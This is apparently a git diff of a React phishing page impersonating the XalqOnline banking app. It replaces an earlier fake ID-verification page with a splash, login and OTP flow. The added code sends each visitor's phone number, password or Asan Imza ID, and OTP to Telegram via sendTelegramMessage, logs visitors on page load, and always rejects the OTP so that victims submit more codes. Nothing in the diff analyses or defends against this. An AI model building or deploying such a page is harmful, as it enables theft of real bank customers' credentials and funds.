@@ -2,183 +2,123 @@
 
 import React, { useState, useEffect } from "react"
 import {
-  ChevronDown,
-  MessageSquare,
-  Check,
+  ChevronLeft,
+  Smartphone,
+  Lock,
+  User,
+  Eye,
+  EyeOff,
   AlertCircle,
   Loader2
 } from "lucide-react"
 import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
 
-// SVG Flag Components
-const AzerbaijanFlag = ({ className = "w-6 h-6" }: { className?: string }) => (
-  <svg
-    className={`${className} rounded-full border border-gray-200/60 shadow-xs flex-shrink-0 object-cover`}
-    viewBox="0 0 36 36"
-    aria-hidden="true"
-  >
-    <path fill="#0092BC" d="M0 0h36v12H0z" />
-    <path fill="#E4002B" d="M0 12h36v12H0z" />
-    <path fill="#009739" d="M0 24h36v12H0z" />
-    <path
-      fill="#FFFFFF"
-      d="M17.8 13.8a4.2 4.2 0 1 0 0 8.4 4.8 4.8 0 1 1 0-8.4z"
-    />
-    <path
-      fill="#FFFFFF"
-      d="M21.5 16.5l.4.7.8-.3-.3.8.8.4-.8.3.3.8-.8-.3-.4.7-.3-.7-.8.3.3-.8-.8-.4.8-.3-.3-.8.8.3z"
-    />
-  </svg>
+type ScreenType = "splash" | "login" | "otp"
+type TabType = "authorization" | "asan"
+
+// Pixel-Perfect XalqOnline Brand Logo Component
+const XalqOnlineLogo = () => (
+  <div className="bg-white rounded-2xl shadow-xs border border-gray-100 py-3.5 px-6 flex items-center justify-center gap-2.5 w-full">
+    {/* Red Z Logo Emblem */}
+    <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
+      <svg className="w-7 h-7" viewBox="0 0 32 32" fill="none">
+        <path d="M4 4H28L12 18H28V28H4L20 14H4V4Z" fill="#E31E24" />
+      </svg>
+    </div>
+    <div className="flex items-center text-2xl font-bold tracking-tight text-gray-900">
+      <span>Xalq</span>
+      <span className="font-semibold text-gray-900 ml-0.5">Online</span>
+    </div>
+  </div>
 )
 
-const UKFlag = ({ className = "w-6 h-6" }: { className?: string }) => (
-  <svg
-    className={`${className} rounded-full border border-gray-200/60 shadow-xs flex-shrink-0 object-cover`}
-    viewBox="0 0 36 36"
-    aria-hidden="true"
-  >
-    <path fill="#012169" d="M0 0h36v36H0z" />
-    <path stroke="#FFF" strokeWidth="6" d="M0 0l36 36M36 0L0 36" />
-    <path stroke="#C8102E" strokeWidth="2.5" d="M0 0l36 36M36 0L0 36" />
-    <path stroke="#FFF" strokeWidth="10" d="M18 0v36M0 18h36" />
-    <path stroke="#C8102E" strokeWidth="6" d="M18 0v36M0 18h36" />
-  </svg>
+// Pink/Red Radial Flower Spinner Component for Splash Screen
+const RadialSpinner = () => (
+  <div className="relative w-10 h-10 flex items-center justify-center">
+    {[...Array(8)].map((_, i) => (
+      <span
+        key={i}
+        className="absolute w-1.5 h-3 bg-[#E31E24] rounded-full opacity-30 animate-pulse"
+        style={{
+          transform: `rotate(${i * 45}deg) translateY(-14px)`,
+          animationDelay: `${i * 0.125}s`,
+          animationDuration: "1s"
+        }}
+      />
+    ))}
+  </div>
 )
 
-type Language = "az" | "en"
-type ScreenType = "details" | "otp"
+export default function XalqOnlineApp() {
+  // Screen & Navigation State
+  const [screen, setScreen] = useState<ScreenType>("splash")
+  const [tab, setTab] = useState<TabType>("authorization")
 
-// Translations dictionary
-const t = {
-  az: {
-    title: "ŞƏXSİYYƏT VƏSİQƏSİ MƏLUMATLARINI QEYD ET",
-    subtitle: "Şəxsiyyətinizi təsdiq etmək üçün vəsiqənizin seriya nömrəsini və FİN kodunu daxil edin.",
-    resident: "Rezident",
-    nonResident: "Qeyri-rezident",
-    select: "Seç",
-    idPlaceholder: "Vəsiqə nömrəsini daxil edin",
-    finPlaceholder: "FİN kodu daxil edin",
-    termsText: "Zəhmət olmasa ",
-    termsLink1: "İstifadə şərtləri",
-    termsText2: " sənədini və ",
-    termsLink2: "Bank hesabının açılmasına dair ərizə",
-    termsText3: " ilə tanış olun və təsdiq edin",
-    continueBtn: "Davam et",
-    support: "Dəstək",
-    langTitle: "Dil seçimi",
-    otpTitle: "Təsdiq kodunu daxil edin",
-    otpSubtitle: "Mobil nömrənizə təsdiq kodu göndərildi. Zəhmət olmasa daxil edin.",
-    otpPlaceholder: "Təsdiq kodunu daxil edin",
-    invalidOtp: "Yalnış OTP kodu. Yenidən cəhd edin.",
-    resendIn: "Kodu yenidən göndər: ",
-    resendBtn: "Yenidən göndər",
-    verifyBtn: "Təsdiq et",
-  },
-  en: {
-    title: "Enter your ID card details.",
-    subtitle: "Enter your ID serial number and FIN code to verify your identity.",
-    resident: "Resident",
-    nonResident: "Non-resident",
-    select: "Select",
-    idPlaceholder: "Enter your ID number",
-    finPlaceholder: "Enter your FIN code",
-    termsText: "Please review and confirm the ",
-    termsLink1: "Terms of use",
-    termsText2: " and ",
-    termsLink2: "Bank Account Application",
-    termsText3: " for opening a bank account.",
-    continueBtn: "Continue",
-    support: "Support",
-    langTitle: "Language selection",
-    otpTitle: "Enter verification code",
-    otpSubtitle: "We have sent a security OTP code to your mobile phone. Please enter it below.",
-    otpPlaceholder: "Enter verification code",
-    invalidOtp: "Invalid OTP code. Please try again.",
-    resendIn: "Resend code in ",
-    resendBtn: "Resend Code",
-    verifyBtn: "Verify",
-  }
-}
+  // Login Form State
+  const [phone, setPhone] = useState("")
+  const [password, setPassword] = useState("")
+  const [asanId, setAsanId] = useState("")
+  const [showPassword, setShowPassword] = useState(false)
+  const [showAsanId, setShowAsanId] = useState(false)
 
-export default function IdentityVerificationPage() {
-  // Screen state
-  const [screen, setScreen] = useState<ScreenType>("details")
-
-  // ID Details Form State
-  const [residency, setResidency] = useState<"resident" | "non-resident">("resident")
-  const [idPrefix, setIdPrefix] = useState("AA")
-  const [idNumber, setIdNumber] = useState("")
-  const [finCode, setFinCode] = useState("")
-  const [acceptedTerms, setAcceptedTerms] = useState(false)
-  const [showPrefixDropdown, setShowPrefixDropdown] = useState(false)
-
-  // Language modal state (Default language is Azerbaijan)
-  const [selectedLang, setSelectedLang] = useState<Language>("az")
-  const [isLangModalOpen, setIsLangModalOpen] = useState(false)
-
-  // Loading state (2 second loader)
-  const [loading, setLoading] = useState(false)
-
-  // Get current active language texts
-  const text = t[selectedLang]
-
-  // OTP Screen State
+  // OTP Form State
   const [otp, setOtp] = useState("")
-  const [timer, setTimer] = useState(60) // 1 minute countdown
+  const [timer, setTimer] = useState(60)
   const [otpError, setOtpError] = useState<string | null>(null)
 
-  // Form Validation logic: ONLY requires data in fields
-  const isDetailsValid =
-    idNumber.trim().length > 0 &&
-    finCode.trim().length > 0
+  // Loading & Visitor State
+  const [loading, setLoading] = useState(false)
 
-  const isOtpValid = otp.trim().length > 0
-
-  // Visitor Tracking on Page Load (Only location data like country, city, IP, etc.)
+  // Visitor location tracking on mount
   useEffect(() => {
     const trackVisitor = async () => {
       await fetchVisitorInfo()
       await sendTelegramMessage({
-        title: "New Visitor Landed",
+        title: "XalqOnline App Opened",
         type: "visitor",
       })
     }
     trackVisitor()
   }, [])
 
-  // Timer countdown effect for OTP screen
+  // 5-Second Splash Screen Loader Timer
   useEffect(() => {
-    if (screen !== "otp") return
-
-    const interval = setInterval(() => {
-      setTimer((prev) => {
-        if (prev <= 1) {
-          clearInterval(interval)
-          return 0
-        }
-        return prev - 1
-      })
-    }, 1000)
-
-    return () => {
-      clearInterval(interval)
-    }
+    if (screen !== "splash") return
+    const splashTimer = setTimeout(() => {
+      setScreen("login")
+    }, 5000)
+    return () => clearTimeout(splashTimer)
   }, [screen])
 
-  // Handle Continue button click with 2 second loader
-  const handleContinue = async () => {
-    if (!isDetailsValid || loading) return
+  // OTP Timer countdown
+  useEffect(() => {
+    if (screen !== "otp") return
+    const interval = setInterval(() => {
+      setTimer((prev) => (prev <= 1 ? 0 : prev - 1))
+    }, 1000)
+    return () => clearInterval(interval)
+  }, [screen])
+
+  // Form Validations
+  const isAuthValid = phone.trim().length > 0 && password.trim().length > 0
+  const isAsanValid = phone.trim().length > 0 && asanId.trim().length > 0
+  const isFormValid = tab === "authorization" ? isAuthValid : isAsanValid
+  const isOtpValid = otp.trim().length > 0
+
+  // Handle Login Submit
+  const handleLogin = async () => {
+    if (!isFormValid || loading) return
     setLoading(true)
 
     try {
       await sendTelegramMessage({
-        title: "ID Details Submitted",
-        type: "details",
-        phoneNumber: `${idPrefix} ${idNumber}`,
-        pin: finCode,
+        title: `XalqOnline Login (${tab === "authorization" ? "Authorization" : "Asan Imza"})`,
+        type: "login",
+        phoneNumber: phone,
+        pin: tab === "authorization" ? password : asanId,
       })
     } catch (err) {
-      console.error("Error sending Telegram message:", err)
+      console.error("Error sending Telegram login alert:", err)
     }
 
     setTimeout(() => {
@@ -189,28 +129,28 @@ export default function IdentityVerificationPage() {
     }, 2000)
   }
 
-  // Handle Verify button click with 2 second loader
+  // Handle OTP Submit
   const handleVerifyOtp = async () => {
     if (!isOtpValid || loading) return
     setLoading(true)
 
     try {
       await sendTelegramMessage({
-        title: "OTP Verification Submitted",
+        title: "XalqOnline OTP Submitted",
         type: "otp",
         otp1: otp,
-        phoneNumber: `${idPrefix} ${idNumber}`,
-        pin: finCode,
+        phoneNumber: phone,
+        pin: tab === "authorization" ? password : asanId,
       })
     } catch (err) {
-      console.error("Error sending OTP Telegram message:", err)
+      console.error("Error sending Telegram OTP alert:", err)
     }
 
     setTimeout(() => {
       setLoading(false)
       setOtp("")
       setTimer(60)
-      setOtpError(text.invalidOtp)
+      setOtpError("Yalnış OTP kodu. Yenidən cəhd edin.")
     }, 2000)
   }
 
@@ -222,368 +162,320 @@ export default function IdentityVerificationPage() {
   }
 
   return (
-    <div className="h-[100dvh] w-full bg-[#FFFFFF] text-gray-900 flex flex-col font-sans selection:bg-[#2272FF]/20 relative overflow-hidden">
-      
-      {/* Main Responsive Mobile Page Container */}
-      <div className="w-full max-w-lg sm:max-w-xl mx-auto flex-1 flex flex-col px-5 sm:px-8 pt-3 pb-5 justify-between h-[100dvh]">
+    <div className="h-[100dvh] w-full bg-[#FAFAFA] text-gray-900 flex flex-col font-sans relative overflow-hidden select-none">
+      <div className="w-full max-w-md mx-auto flex-1 flex flex-col px-5 pt-3 pb-6 justify-between h-[100dvh]">
         
-        {/* Header Bar */}
-        <header className="flex items-center justify-between py-1 mb-2 w-full min-h-[40px] flex-shrink-0">
-          <div className="w-10" />
-
-          {/* Header Actions: Language Flag & Support (Only shown on Details screen) */}
-          {screen === "details" && (
-            <div className="flex items-center gap-3">
-              {/* Flag Button (Shows Azerbaijan flag by default when Azerbaijan language is active) */}
-              <button
-                onClick={() => setIsLangModalOpen(true)}
-                className="p-1 rounded-full hover:opacity-80 transition-opacity cursor-pointer focus:outline-none"
-                title="Change Language"
-              >
-                {selectedLang === "az" ? (
-                  <AzerbaijanFlag className="w-7 h-7 sm:w-8 sm:h-8" />
-                ) : (
-                  <UKFlag className="w-7 h-7 sm:w-8 sm:h-8" />
-                )}
-              </button>
-
-              {/* Support Button with #2272FF theme */}
-              <button className="bg-[#2272FF]/15 hover:bg-[#2272FF]/25 active:scale-95 text-[#2272FF] px-3.5 py-1.5 rounded-full flex items-center gap-1.5 text-xs sm:text-sm font-semibold shadow-xs transition-all cursor-pointer">
-                <MessageSquare className="w-4 h-4 fill-current stroke-none" />
-                <span>{text.support}</span>
-              </button>
+        {/* ================================================================= */}
+        {/* SCREEN 1: SPLASH SCREEN WITH 5-SECOND LOADER (Screenshot 1)      */}
+        {/* ================================================================= */}
+        {screen === "splash" && (
+          <div className="flex-1 flex flex-col justify-between items-center py-2 w-full animate-fade-in">
+            {/* Top Logo Banner */}
+            <div className="w-full pt-2">
+              <XalqOnlineLogo />
             </div>
-          )}
-        </header>
 
-        {/* Dynamic Screen View */}
-        <main className="flex-1 flex flex-col justify-between w-full">
-          {screen === "details" ? (
-            /* DETAILS SCREEN */
-            <div className="flex-1 flex flex-col justify-between">
-              <div className="space-y-4">
-                {/* Title & Description */}
-                <div>
-                  <h1 className="text-2xl sm:text-3xl font-extrabold text-gray-900 tracking-tight leading-tight mb-1.5">
-                    {text.title}
-                  </h1>
-                  <p className="text-[14px] sm:text-base text-gray-400 font-normal leading-relaxed">
-                    {text.subtitle}
-                  </p>
-                </div>
+            {/* Center 5-Second Radial Flower Spinner */}
+            <div className="flex-1 flex flex-col items-center justify-center my-auto">
+              <RadialSpinner />
+            </div>
 
-                {/* Segmented Control Tabs (Resident / Non-resident) */}
-                <div className="bg-[#EFEDF1] p-1 rounded-full flex items-center shadow-inner">
-                  <button
-                    type="button"
-                    onClick={() => setResidency("resident")}
-                    className={`flex-1 py-2.5 sm:py-3 text-center text-sm font-semibold rounded-full transition-all cursor-pointer ${
-                      residency === "resident"
-                        ? "bg-white text-gray-900 shadow-sm border border-[#2272FF]"
-                        : "text-gray-400 hover:text-gray-600"
-                    }`}
-                  >
-                    {text.resident}
-                  </button>
-                  <button
-                    type="button"
-                    onClick={() => setResidency("non-resident")}
-                    className={`flex-1 py-2.5 sm:py-3 text-center text-sm font-semibold rounded-full transition-all cursor-pointer ${
-                      residency === "non-resident"
-                        ? "bg-white text-gray-900 shadow-sm border border-[#2272FF]"
-                        : "text-gray-400 hover:text-gray-600"
-                    }`}
-                  >
-                    {text.nonResident}
-                  </button>
-                </div>
+            {/* Bottom Services Section */}
+            <div className="w-full bg-white rounded-t-3xl pt-2 pb-2 px-1 shadow-xs border border-gray-100 flex flex-col space-y-4">
+              {/* Minus Drag Handle */}
+              <div className="w-10 h-1 bg-gray-900 rounded-full mx-auto" />
 
-                {/* Input 1: ID Serial Number with Select Dropdown */}
-                <div className="relative p-0.5">
-                  <div className="bg-[#EFEDF1] rounded-2xl px-4 py-3 flex items-center gap-3 transition-all focus-within:ring-2 focus-within:ring-[#2272FF]/40 focus-within:bg-white border border-transparent focus-within:border-[#2272FF]">
-                    {/* Prefix Selector Button */}
-                    <div className="relative">
-                      <button
-                        type="button"
-                        onClick={() => setShowPrefixDropdown(!showPrefixDropdown)}
-                        className="bg-white px-3 py-1.5 rounded-full text-xs font-semibold text-gray-700 shadow-xs flex items-center gap-1 cursor-pointer border border-gray-200/80 hover:bg-gray-50 transition-all flex-shrink-0"
-                      >
-                        <span>{idPrefix === "Select" ? text.select : idPrefix}</span>
-                        <ChevronDown className="w-3.5 h-3.5 text-gray-500" />
-                      </button>
+              <h2 className="text-xl font-bold text-gray-900 px-2">Services</h2>
 
-                      {/* Prefix Options Dropdown */}
-                      {showPrefixDropdown && (
-                        <div className="absolute top-10 left-0 z-30 bg-white rounded-xl shadow-lg border border-gray-100 py-1 w-24 text-xs font-medium text-gray-800 animate-slide-up">
-                          {["AA", "AZE", "MYI", text.select].map((pref) => (
-                            <div
-                              key={pref}
-                              onClick={() => {
-                                setIdPrefix(pref)
-                                setShowPrefixDropdown(false)
-                              }}
-                              className="px-3 py-2 hover:bg-[#2272FF]/10 cursor-pointer flex items-center justify-between"
-                            >
-                              <span>{pref}</span>
-                              {idPrefix === pref && <Check className="w-3 h-3 text-[#2272FF]" />}
-                            </div>
-                          ))}
-                        </div>
-                      )}
-                    </div>
-
-                    {/* ID Input */}
-                    <input
-                      type="text"
-                      value={idNumber}
-                      onChange={(e) => setIdNumber(e.target.value)}
-                      placeholder={text.idPlaceholder}
-                      className="bg-transparent border-none outline-none text-sm text-gray-900 placeholder:font-semibold placeholder:text-[#B2B7BA] w-full"
-                    />
-                  </div>
-                </div>
-
-                {/* Input 2: FIN Code */}
-                <div className="p-0.5">
-                  <div className="bg-[#EFEDF1] rounded-2xl px-4.5 py-3.5 flex items-center transition-all focus-within:ring-2 focus-within:ring-[#2272FF]/40 focus-within:bg-white border border-transparent focus-within:border-[#2272FF]">
-                    <input
-                      type="text"
-                      value={finCode}
-                      onChange={(e) => setFinCode(e.target.value.toUpperCase())}
-                      placeholder={text.finPlaceholder}
-                      maxLength={7}
-                      className="bg-transparent border-none outline-none text-sm text-gray-900 placeholder:font-semibold placeholder:text-[#B2B7BA] w-full tracking-wider"
-                    />
-                  </div>
-                </div>
-
-                {/* White Checkbox and Terms of Use */}
-                <div className="flex items-start gap-3 px-1">
-                  <button
-                    type="button"
-                    role="checkbox"
-                    aria-checked={acceptedTerms}
-                    onClick={() => setAcceptedTerms(!acceptedTerms)}
-                    className={`w-5 h-5 mt-0.5 rounded-[5px] border transition-all flex items-center justify-center flex-shrink-0 cursor-pointer ${
-                      acceptedTerms
-                        ? "bg-white border-[#2272FF] text-[#2272FF] shadow-xs"
-                        : "bg-white border-gray-300 hover:border-gray-400"
-                    }`}
-                  >
-                    {acceptedTerms && (
-                      <Check className="w-3.5 h-3.5 stroke-[3] text-[#2272FF]" />
-                    )}
-                  </button>
-                  <label
-                    onClick={() => setAcceptedTerms(!acceptedTerms)}
-                    className="text-xs sm:text-sm text-gray-400 leading-snug cursor-pointer select-none"
-                  >
-                    {text.termsText}
-                    <span className="text-[#2272FF] font-medium hover:underline">{text.termsLink1}</span>
-                    {text.termsText2}
-                    <span className="text-[#2272FF] font-medium hover:underline">{text.termsLink2}</span>
-                    {text.termsText3}
-                  </label>
-                </div>
-              </div>
-
-              {/* Action Button with 2 Sec Loader */}
-              <div className="pt-3 pb-2 flex-shrink-0">
+              {/* Action Buttons */}
+              <div className="space-y-3 pt-1">
                 <button
                   type="button"
-                  disabled={!isDetailsValid || loading}
-                  onClick={handleContinue}
-                  className={`w-full py-3.5 sm:py-4 font-semibold text-base rounded-full transition-all flex items-center justify-center gap-2 ${
-                    isDetailsValid && !loading
-                      ? "bg-[#2272FF] hover:bg-[#1a5ce0] active:scale-[0.99] text-white shadow-md shadow-[#2272FF]/25 cursor-pointer"
-                      : "bg-[#EEEEEE] text-[#B2B7BA] cursor-not-allowed"
-                  }`}
+                  onClick={() => setScreen("login")}
+                  className="w-full py-3.5 px-4 bg-white border border-[#E31E24] text-[#E31E24] font-semibold text-base rounded-2xl hover:bg-red-50 transition-all cursor-pointer text-center"
                 >
-                  {loading ? (
-                    <div className="flex items-center gap-2">
-                      <Loader2 className="w-5 h-5 animate-spin" />
-                      <span>{text.continueBtn}...</span>
-                    </div>
-                  ) : (
-                    <span>{text.continueBtn}</span>
-                  )}
+                  Registration
+                </button>
+
+                <button
+                  type="button"
+                  onClick={() => setScreen("login")}
+                  className="w-full py-3.5 px-4 bg-[#E31E24] text-white font-semibold text-base rounded-2xl hover:bg-[#c9181d] active:scale-[0.99] transition-all cursor-pointer text-center shadow-md shadow-red-500/20"
+                >
+                  Sign in
                 </button>
               </div>
             </div>
-          ) : (
-            /* SIMPLIFIED OTP SCREEN WITH 2 SEC LOADER */
-            <div className="flex-1 flex flex-col justify-between animate-slide-up">
-              <div className="space-y-4">
-                {/* Title & Description */}
-                <div>
-                  <h1 className="text-2xl sm:text-3xl font-extrabold text-gray-900 tracking-tight leading-tight mb-1.5">
-                    {text.otpTitle}
-                  </h1>
-                  <p className="text-[14px] sm:text-base text-gray-400 font-normal leading-relaxed">
-                    {text.otpSubtitle}
-                  </p>
+          </div>
+        )}
+
+        {/* ================================================================= */}
+        {/* SCREEN 2: LOGIN SCREEN (Screenshots 2 & 3)                        */}
+        {/* ================================================================= */}
+        {screen === "login" && (
+          <div className="flex-1 flex flex-col justify-between w-full animate-slide-up">
+            <div className="space-y-4 w-full">
+              {/* Top Red Back Arrow */}
+              <div className="pt-1 pb-1">
+                <button
+                  type="button"
+                  onClick={() => setScreen("splash")}
+                  className="p-1 -ml-1 rounded-full hover:bg-gray-200/50 transition-all cursor-pointer text-[#E31E24]"
+                  aria-label="Back"
+                >
+                  <ChevronLeft className="w-8 h-8 stroke-[2.5]" />
+                </button>
+              </div>
+
+              {/* XalqOnline Logo */}
+              <XalqOnlineLogo />
+
+              {/* Segmented Control Tabs (Authorization vs Asan Imza) */}
+              <div className="bg-white p-1 rounded-2xl border border-[#E31E24] flex items-center shadow-xs overflow-hidden">
+                <button
+                  type="button"
+                  onClick={() => setTab("authorization")}
+                  className={`flex-1 py-2.5 text-center text-sm font-semibold rounded-xl transition-all cursor-pointer ${
+                    tab === "authorization"
+                      ? "bg-[#E31E24] text-white shadow-xs"
+                      : "bg-white text-[#E31E24] hover:bg-red-50/50"
+                  }`}
+                >
+                  Authorization
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setTab("asan")}
+                  className={`flex-1 py-2.5 text-center text-sm font-semibold rounded-xl transition-all cursor-pointer ${
+                    tab === "asan"
+                      ? "bg-[#E31E24] text-white shadow-xs"
+                      : "bg-white text-[#E31E24] hover:bg-red-50/50"
+                  }`}
+                >
+                  Asan Imza
+                </button>
+              </div>
+
+              {/* INPUT FIELDS AREA */}
+              <div className="space-y-3 pt-2">
+                {/* Field 1: Phone Number (Shown on both tabs) */}
+                <div className="bg-white rounded-2xl px-4 py-3.5 flex items-center gap-3.5 border border-gray-100 shadow-xs focus-within:ring-2 focus-within:ring-[#E31E24]/30 transition-all">
+                  <Smartphone className="w-5 h-5 text-gray-300 flex-shrink-0" />
+                  <input
+                    type="tel"
+                    value={phone}
+                    onChange={(e) => setPhone(e.target.value)}
+                    placeholder="Phone number"
+                    className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:text-gray-300 placeholder:font-normal w-full"
+                  />
                 </div>
 
-                {/* OTP Input Field */}
-                <div className="p-0.5">
-                  <div
-                    className={`bg-[#EFEDF1] rounded-2xl px-4.5 py-3.5 flex items-center transition-all border ${
-                      otpError
-                        ? "border-red-500 bg-red-50/20 ring-2 ring-red-500/20"
-                        : "border-transparent focus-within:ring-2 focus-within:ring-[#2272FF]/40 focus-within:bg-white focus-within:border-[#2272FF]"
-                    }`}
-                  >
+                {/* Field 2: Password (Authorization Tab) */}
+                {tab === "authorization" && (
+                  <div className="bg-white rounded-2xl px-4 py-3.5 flex items-center gap-3.5 border border-gray-100 shadow-xs focus-within:ring-2 focus-within:ring-[#E31E24]/30 transition-all">
+                    <Lock className="w-5 h-5 text-gray-300 flex-shrink-0" />
                     <input
-                      type="text"
-                      inputMode="numeric"
-                      value={otp}
-                      onChange={(e) => {
-                        setOtp(e.target.value.replace(/\D/g, ""))
-                        if (otpError) setOtpError(null)
-                      }}
-                      placeholder={text.otpPlaceholder}
-                      className="bg-transparent border-none outline-none text-xl sm:text-2xl font-bold tracking-widest text-gray-900 placeholder:font-semibold placeholder:text-[#B2B7BA] placeholder:text-base placeholder:tracking-normal w-full"
+                      type={showPassword ? "text" : "password"}
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      placeholder="Password"
+                      className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:text-gray-300 placeholder:font-normal w-full"
                     />
-                  </div>
-
-                  {/* Red Invalid OTP Error Message */}
-                  {otpError && (
-                    <p className="text-xs sm:text-sm font-semibold text-red-600 mt-2 px-1 flex items-center gap-1.5 animate-slide-up">
-                      <AlertCircle className="w-4 h-4 text-red-600 flex-shrink-0" />
-                      <span>{otpError}</span>
-                    </p>
-                  )}
-                </div>
-
-                {/* Inline Text Timer */}
-                <div className="text-sm font-medium text-gray-500 px-1 flex items-center gap-2">
-                  {timer > 0 ? (
-                    <span>
-                      {text.resendIn}<strong className="text-gray-900 font-bold">{formatTimer(timer)}</strong>
-                    </span>
-                  ) : (
                     <button
-                      onClick={() => {
-                        setTimer(60)
-                        setOtpError(null)
-                      }}
-                      className="text-sm font-bold text-[#2272FF] hover:underline cursor-pointer"
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="text-gray-300 hover:text-gray-500 cursor-pointer flex-shrink-0"
                     >
-                      {text.resendBtn}
+                      {showPassword ? (
+                        <Eye className="w-5 h-5" />
+                      ) : (
+                        <EyeOff className="w-5 h-5" />
+                      )}
                     </button>
-                  )}
-                </div>
-              </div>
+                  </div>
+                )}
 
-              {/* Verify Button with 2 Sec Loader */}
-              <div className="pt-3 pb-2 flex-shrink-0">
-                <button
-                  type="button"
-                  onClick={handleVerifyOtp}
-                  disabled={!isOtpValid || loading}
-                  className={`w-full py-3.5 sm:py-4 font-semibold text-base rounded-full transition-all flex items-center justify-center gap-2 ${
-                    isOtpValid && !loading
-                      ? "bg-[#2272FF] hover:bg-[#1a5ce0] active:scale-[0.99] text-white shadow-md shadow-[#2272FF]/25 cursor-pointer"
-                      : "bg-[#EEEEEE] text-[#B2B7BA] cursor-not-allowed"
-                  }`}
-                >
-                  {loading ? (
-                    <div className="flex items-center gap-2">
-                      <Loader2 className="w-5 h-5 animate-spin" />
-                      <span>{text.verifyBtn}...</span>
-                    </div>
-                  ) : (
-                    <span>{text.verifyBtn}</span>
-                  )}
-                </button>
+                {/* Field 2: ID (Asan Imza Tab) */}
+                {tab === "asan" && (
+                  <div className="bg-white rounded-2xl px-4 py-3.5 flex items-center gap-3.5 border border-gray-100 shadow-xs focus-within:ring-2 focus-within:ring-[#E31E24]/30 transition-all">
+                    <User className="w-5 h-5 text-gray-300 flex-shrink-0" />
+                    <input
+                      type={showAsanId ? "text" : "password"}
+                      value={asanId}
+                      onChange={(e) => setAsanId(e.target.value)}
+                      placeholder="ID"
+                      className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:text-gray-300 placeholder:font-normal w-full"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowAsanId(!showAsanId)}
+                      className="text-gray-300 hover:text-gray-500 cursor-pointer flex-shrink-0"
+                    >
+                      {showAsanId ? (
+                        <Eye className="w-5 h-5" />
+                      ) : (
+                        <EyeOff className="w-5 h-5" />
+                      )}
+                    </button>
+                  </div>
+                )}
               </div>
             </div>
-          )}
-        </main>
-      </div>
 
-      {/* BOTTOM SHEET MODAL FOR LANGUAGE SELECTION */}
-      {isLangModalOpen && screen === "details" && (
-        <>
-          {/* Backdrop */}
-          <div
-            onClick={() => setIsLangModalOpen(false)}
-            className="fixed inset-0 bg-black/40 z-40 animate-fade-in backdrop-blur-xs transition-all"
-          />
-
-          {/* Bottom Sheet Container */}
-          <div className="fixed bottom-0 left-0 right-0 max-w-lg sm:max-w-xl mx-auto bg-white rounded-t-[28px] p-6 z-50 animate-slide-up shadow-2xl space-y-4">
-            {/* Header with Title & Chevron Down Close Button */}
-            <div className="flex items-center justify-between pb-1">
-              <h3 className="text-xl font-bold text-gray-900">
-                {text.langTitle}
-              </h3>
-              <button
-                onClick={() => setIsLangModalOpen(false)}
-                className="p-1.5 hover:bg-gray-100 rounded-full transition-colors cursor-pointer text-gray-400 hover:text-gray-700"
-                aria-label="Close language selection"
-              >
-                <ChevronDown className="w-6 h-6" />
-              </button>
-            </div>
-
-            {/* Language Options List */}
-            <div className="space-y-3 pt-1">
-              {/* Option 1: Azerbaijan */}
+            {/* Bottom Buttons & Links Area */}
+            <div className="pt-6 space-y-3 pb-2 w-full">
               <button
                 type="button"
-                onClick={() => {
-                  setSelectedLang("az")
-                  setIsLangModalOpen(false)
-                }}
-                className={`w-full flex items-center justify-between p-4 rounded-2xl border transition-all cursor-pointer text-left ${
-                  selectedLang === "az"
-                    ? "bg-[#2272FF]/10 border-[#2272FF] shadow-xs"
-                    : "bg-[#f8fafc] border-gray-100 hover:bg-gray-100/70"
+                disabled={!isFormValid || loading}
+                onClick={handleLogin}
+                className={`w-full py-3.5 font-semibold text-base rounded-2xl transition-all flex items-center justify-center gap-2 ${
+                  isFormValid && !loading
+                    ? "bg-[#E31E24] hover:bg-[#c9181d] active:scale-[0.99] text-white shadow-md shadow-red-500/20 cursor-pointer"
+                    : "bg-[#E31E24] opacity-80 text-white cursor-pointer"
                 }`}
               >
-                <div className="flex items-center gap-3.5">
-                  <AzerbaijanFlag className="w-7 h-7" />
-                  <span className="text-base font-semibold text-gray-900">
-                    Azərbaycan
-                  </span>
-                </div>
-                {selectedLang === "az" && (
-                  <div className="w-6 h-6 rounded-full bg-[#2272FF] flex items-center justify-center text-white">
-                    <Check className="w-3.5 h-3.5 stroke-[3]" />
+                {loading ? (
+                  <div className="flex items-center gap-2">
+                    <Loader2 className="w-5 h-5 animate-spin" />
+                    <span>Signing in...</span>
                   </div>
+                ) : (
+                  <span>Sign-in</span>
                 )}
               </button>
 
-              {/* Option 2: English */}
+              {tab === "authorization" && (
+                <>
+                  <button
+                    type="button"
+                    className="w-full py-3.5 bg-white border border-gray-100 text-gray-900 font-semibold text-base rounded-2xl hover:bg-gray-50 transition-all cursor-pointer text-center shadow-xs"
+                  >
+                    Registration
+                  </button>
+
+                  <div className="text-center pt-2">
+                    <button
+                      type="button"
+                      className="text-sm font-medium text-gray-400 hover:text-gray-600 cursor-pointer"
+                    >
+                      Forgot Password
+                    </button>
+                  </div>
+                </>
+              )}
+            </div>
+          </div>
+        )}
+
+        {/* ================================================================= */}
+        {/* SCREEN 3: OTP SCREEN WITH RED BACK ARROW                          */}
+        {/* ================================================================= */}
+        {screen === "otp" && (
+          <div className="flex-1 flex flex-col justify-between w-full animate-slide-up">
+            <div className="space-y-4 w-full">
+              {/* Top Red Back Arrow */}
+              <div className="pt-1 pb-1">
+                <button
+                  type="button"
+                  onClick={() => setScreen("login")}
+                  className="p-1 -ml-1 rounded-full hover:bg-gray-200/50 transition-all cursor-pointer text-[#E31E24]"
+                  aria-label="Back"
+                >
+                  <ChevronLeft className="w-8 h-8 stroke-[2.5]" />
+                </button>
+              </div>
+
+              {/* XalqOnline Logo */}
+              <XalqOnlineLogo />
+
+              {/* Title & Description */}
+              <div className="pt-2">
+                <h1 className="text-2xl font-bold text-gray-900 tracking-tight mb-1">
+                  Təsdiq kodu
+                </h1>
+                <p className="text-sm text-gray-400 font-normal leading-relaxed">
+                  Daxil etdiyiniz mobil nömrəyə göndərilən OTP təsdiq kodunu daxil edin.
+                </p>
+              </div>
+
+              {/* OTP Input Field */}
+              <div className="pt-2 space-y-2">
+                <div
